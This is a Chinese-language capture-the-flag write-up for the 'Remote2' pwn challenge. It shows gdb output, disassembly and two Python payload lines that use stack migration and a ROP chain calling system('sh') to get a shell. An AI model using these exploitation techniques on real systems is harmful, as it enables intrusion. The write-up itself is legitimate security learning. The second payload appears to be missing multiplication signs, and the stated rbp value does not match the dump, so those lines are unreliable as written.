Remote2
==========
這題在比賽當天沒有想出來，後來看到別人的想法才摸出來的，不過實作上也花了一些時間...
主要用到 stack migration 和 ROP 來做。

解題流程
----------
程式一開始會用執行 "lsh"，之後逐字讀取 64bytes 到 buffer 上，然後就馬上 retuen。
先用 gdb 觀察一下 buffer 和 rbp 的距離，rbp此時為 0x7ffc98f88e1。

	(gdb) x/10gx $rsp
	0x7fffffffdf50: 0x4141414141414141      0x0000000000000000
	0x7fffffffdf60: 0x00000000004005c0      0x0000000000400470
	0x7fffffffdf70: 0x00007fffffffe060      0x0000000800000000
	0x7fffffffdf80: 0x00000000004005c0      0x00007ffff7a58730
	0x7fffffffdf90: 0x0000000000000000      0x00007fffffffe068

可以發現 64bytes 只夠我們剛好塞到 retuen address，後面沒有空間放其他 gadget。所以我們將要做的事分成兩次送。

第一輪我們先利用 stack migration 把 rbp 引導到自己找的 buffer 上，並 retuen 回 main 裡面讀取字元的程式區塊，將 ROP chain 讀到新的 buffer 上。
```python
'A'*44 + '\x2c\x00\x00\x00' + p64(buf+0x80) + p64(main_read)
```

可以讀到新的 buffer 上是因為程式為由 rbp 為基準，推算出區域變數的位置。所以 rbp 一改，buffer 的位址也跟著變了。
<pre>
400582:       8b 45 fc                mov    eax,DWORD PTR [<b>rbp-0x4</b>]
400585:       48 8d 55 d0             lea    rdx,[<b>rbp-0x30</b>]
400589:       48 01 d0                add    rax,rdx
40058c:       ba 01 00 00 00          mov    edx,0x1
400591:       48 89 c6                mov    rsi,rax
400594:       bf 00 00 00 00          mov    edi,0x0
400599:       e8 a2 fe ff ff          call   400440 <read@plt>
</pre>
----------
另外有個地方要特別注意，由於這題是一個字一個字讀輸入，我們在蓋 buffer 時會把位於 rbp-0x4，
用來計數的值寫掉。
<pre>
0x7fffffffdf70: 0x00007fffffffe060      0x<b>00000008</b>00000000
</pre>
這會導致程式沒辦法正確判斷你讀了幾 byte 以及該讀去哪個位置。所以蓋到這邊的時候，必須將該位址原本的值再寫上去。

----------
最後，利用 leave ret 的 gadget 將 rsp 指到 ROP chain 上，並跳進第一個 gadget 開始跑，就可以拿到 shell 了！
```python
'A'7 + p64(pop_rdi_ret) + p64(sh) + p64(system) + 'A'12 + '\x2c\x00\x00\x00' + p64(buf+0x80-0x30) + p64(leave_ret)
```
